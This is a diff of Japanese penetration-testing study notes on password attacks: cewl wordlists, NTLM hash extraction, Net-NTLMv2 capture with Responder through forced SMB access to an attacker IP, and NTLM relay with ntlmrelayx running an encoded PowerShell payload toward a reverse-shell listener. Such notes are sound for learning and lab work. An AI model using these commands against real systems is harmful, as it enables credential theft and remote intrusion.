@@ -206,10 +206,10 @@ sort combined.txt | uniq -u > cleaned_list.txt
 
 - *cewl*：企業のWebサイトやサービス名、従業員名などから単語を抽出しワードリストを生成
 ```zsh
-cewl -w <output> -d 5 -m <最小値> https://<TargetIP>
+cewl -w <output> -d 5 -m <最小値> https://<target_IP>
 
 # メールアドレスは抽出してemails.txtに、それ以外はcewl.txtに保存
-cewl -e --email_file emails.txt -m 5 -w cewl.txt http://<TargetIP>
+cewl -e --email_file emails.txt -m 5 -w cewl.txt http://<target_IP>
 ```
 - `-d`：クローリングの深さのレベル
 - `-m`：文字の長さの最小値
@@ -290,25 +290,9 @@ python3 cupp.py -a
 
 - 前提知識：
 	- [用語](../../Misc/用語.md#SAM)
-	- [用語](../../Misc/用語.md#NTLM周りの用語)
+	- [NTLM周りの用語](../../Misc/用語.md#NTLM周りの用語)
 
-## NTLM Hashのクラッキング
-
-### シチュエーション
-
-- Windows環境で<u>獲得したユーザーがlocal administratorグループに属するとき</u>
-```powershell
-whoami
-```
-```powershell
-net user <username>
-```
-	↓
-```
-Local Group Memberships *Administrators
-```
-
-### NTLMハッシュの取得方法 w/ Mimikatz
+- NTLM Hashのクラッキング
 
 [🥝Mimikatz](../../Tools/🥝Mimikatz.md#認証情報の抽出)
 
@@ -344,12 +328,11 @@ Local Group Memberships [*Administrators以外]
  - シェルを獲得できずコード実行ができない場合でも、Windowsサーバーへファイルアップロードが可能なWebアプリケーションを発見したとき
 
 - SMBサーバーにファイルアップロードが可能なとき
-	- 参考：[Proving Grounds Practice write-up - Vault](https://medium.com/@Dpsypher/proving-grounds-practice-vault-158516460860)
-
+	- 参考🔗：[Proving Grounds Practice write-up - Vault](https://medium.com/@Dpsypher/proving-grounds-practice-vault-158516460860)
 
 ### Net-NTLMv2クラッキング概要
 
-- 権限が低く、MimikatzなどでパスワードやNTLMハッシュを抜くことができなくても、Net-NTLMv2認証プロトコルを悪用して、ハッシュを取得 → クラックし、パスワードを得る。
+- 権限が低く、MimikatzなどでパスワードやNTLMハッシュを抜くことができなくても、Net-NTLMv2認証プロトコルを悪用して、ハッシュを取得 → クラックし、パスワードを得る
 
 1. 攻撃者側で[*Responder*](https://github.com/lgandx/Responder)を用意する
 	- SMB, HTTP, FTP, LLMNR, NBT-NS, MDNSなど、さまざまなプロトコルをサポート
@@ -368,19 +351,19 @@ sudo responder -I <interface(tun0等)>
 2. ターゲット上から攻撃者のResponderにNet-NTLMv2認証をさせる
 - 方法A：ターゲットシェルを獲得し、ターゲット上から攻撃者上の存在しないSMB共有にアクセスさせる
 ```powershell
-dir \\<AttackerIP>\hoge
+dir \\<attacker_IP>\hoge
 ```
 
 ・方法B : WebアプリでRFIの脆弱性を利用して、ターゲットから攻撃者上の存在しないSMB共有にアクセスさせる
 ```sh
-http://example/page=//<AttackerIP>/hoge
+http://example/page=//<attacker_IP>/hoge
 ```
 
 - 方法C：Webアプリでファイルアップロードし、攻撃者上の存在しないSMB共有にアクセスさせる
 	- ⚠️ファイルアップロード機能が==SMBを介して可能である場合に==成功する
 	- Burp Suiteなどでfilenameパラメタを以下の値に変更してリクエストする
 ```
-\\\\<AttackerIP>\hoge\hoge.txt
+\\\\<attacker_IP>\hoge\hoge.txt
 ```
 
 ![](../../画像ファイル/Pasted%20image%2020250720111345.png)
@@ -412,9 +395,9 @@ $$filenameパラメタの値を攻撃者のIPを指すUNCパスに変更$$
 
 2. 攻撃者マシン上でntlmrelayxを起動
 ```zsh
-impacket-ntlmrelayx --no-http-server -smb2support -t $TargetIP -c "powershell -enc <base64_encoded_payload>"
+impacket-ntlmrelayx --no-http-server -smb2support -t <target_IP> -c "powershell -enc <base64_encoded_payload>"
 ```
-- 🚨`$TargetIP`に設定するIPは、リレー先のもの（リレー元ではない）
+- 🚨`<target_IP>`に設定するIPは、リレー先のもの（リレー元ではない）
 
 3. リバースシェルリスナーを用意
 ```zsh
@@ -431,13 +414,13 @@ sudo rlwrap nc -lvnp <port>
 
 # Windows Credential Guardの仕組みとその回避
 
-- 💥[🥝Mimikatz](../../Tools/🥝Mimikatz.md#Credential%20Guardを回避してパスワード窃取)
+- [Credential Guardを回避してパスワード窃取](../../Tools/🥝Mimikatz.md#Credential%20Guardを回避してパスワード窃取)
 
 ## Windows Credential Guardの仕組み
 
 ### Credential Guardの前提知識
 
-- [用語](../../Misc/用語.md#LSA)
+- [LSA](../../Misc/用語.md#LSA)
 
 #### Virtualization-based Security (VBS) 概要
 
